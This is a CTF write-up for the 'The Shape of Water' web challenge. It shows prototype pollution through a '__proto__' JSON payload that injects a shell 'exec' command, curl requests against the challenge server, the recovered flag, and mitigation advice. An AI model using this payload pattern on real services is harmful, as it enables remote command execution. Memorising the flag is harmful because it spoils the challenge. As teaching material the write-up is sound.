# The Shape of Water - CTF Writeup

## Challenge Information
- **Name**: The Shape of Water
- **Platform**: UWSP Pointer Overflow CTF
- **Category**: Web
- **Difficulty**: Medium-Hard
- **Target**: https://web300-2.pointeroverflowctf.com/

## Challenge Description
The Lacustrine Conservancy runs a preview service for testing theme settings and publishing newsletters. The server merges user-supplied JSON into its global configuration during the build process. Our goal is to retrieve the contents of `/flag.txt` from the server.

## Vulnerability Discovery

### Initial Reconnaissance
The challenge provides several API endpoints:
- `POST /api/settings` - Submit JSON to merge into server configuration
- `GET /api/build` - Generate newsletter preview (processes configuration)
- `GET /api/debug/cfg` - Show current configuration's own properties
- `GET /api/logs` - Show build and settings logs
- `POST /api/reset` - Clear current settings and logs

### Key Observations

1. **Examining the Logs**: The `/api/logs` endpoint revealed previous exploitation attempts:
```
[2025-11-07T17:56:59.847Z] exec ran: pwd && echo ---FILES--- && find . -name newsletter.html 2>/dev/null && echo ---FLAG--- && cat /flag.txt
```

2. **Reset Message**: When resetting the configuration:
```json
{"ok":true,"message":"reset complete (prototype may remain polluted if you changed it)"}
```
This message explicitly mentions **prototype pollution**, confirming the vulnerability type.

3. **Build Process Behavior**: The build output shows:
```
[build] newsletter generated
[build] found exec in config; executing...
[build] done.
```
This indicates the build process checks for an `exec` property in the configuration and executes it as a shell command.

## Vulnerability: Prototype Pollution

### What is Prototype Pollution?
Prototype pollution is a JavaScript vulnerability where attackers can inject properties into `Object.prototype`. Since JavaScript objects inherit from `Object.prototype`, polluting it affects all objects in the application.

### How It Works Here
1. The server merges user-supplied JSON into its configuration using an unsafe merge function
2. By using the special key `__proto__` in JSON, we can modify `Object.prototype`
3. Any property we add to `__proto__` becomes available on all objects
4. The build process checks if the config has an `exec` property (including inherited ones)
5. If found, it executes the command

## Exploitation

### Payload Structure
```json
{
  "__proto__": {
    "exec": "pwd && echo ---FILES--- && find . -name newsletter.html 2>/dev/null && echo ---FLAG--- && cat /flag.txt"
  }
}
```

### Attack Steps

1. **Inject Prototype Pollution**:
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"__proto__":{"exec":"cat /flag.txt"}}' \
  https://web300-2.pointeroverflowctf.com/api/settings
```

2. **Trigger Build Process**:
```bash
curl https://web300-2.pointeroverflowctf.com/api/build
```

3. **Extract Flag from Output**:
The build process executes our injected command and includes the output:
```
[build] found exec in config; executing...
poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
```

## Technical Details

### Why Prototype Pollution Persists
The pollution persists across reset operations because:
- The `__proto__` modification affects the global `Object.prototype`
- Resetting the configuration only clears "own properties"
- Properties on the prototype chain remain intact
- Node.js process would need to restart to clear prototype pollution

### Why `/api/debug/cfg` Doesn't Show Polluted Properties
The debug endpoint shows "current configuration's own properties" (as mentioned in the challenge description). It uses `Object.keys()` or similar which only returns own properties, not inherited ones from the prototype chain.

However, when the build process checks for `exec`, it uses property access (like `config.exec` or `'exec' in config`), which checks the entire prototype chain.

## Flag
```
poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
```

## Mitigation Recommendations

1. **Use Safe Merge Functions**:
   - Use `Object.assign()` with a null prototype: `Object.assign(Object.create(null), ...)`
   - Or use libraries like `lodash.merge` with proper configuration

2. **Validate Input**:
   - Block special keys like `__proto__`, `constructor`, and `prototype`
   - Use schema validation for user input

3. **Use `Object.create(null)`**:
   - Create objects without prototype: `const config = Object.create(null)`
   - This prevents prototype chain attacks

4. **Avoid Dynamic Property Access**:
   - Use `Object.hasOwnProperty()` instead of `in` operator
   - Check only own properties, not inherited ones

5. **Freeze Prototypes**:
   - Use `Object.freeze(Object.prototype)` to prevent modifications
   - Note: This may break some libraries

## References
- [Prototype Pollution Attack (OWASP)](https://owasp.org/www-community/attacks/Prototype_Pollution)
- [Understanding JavaScript Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
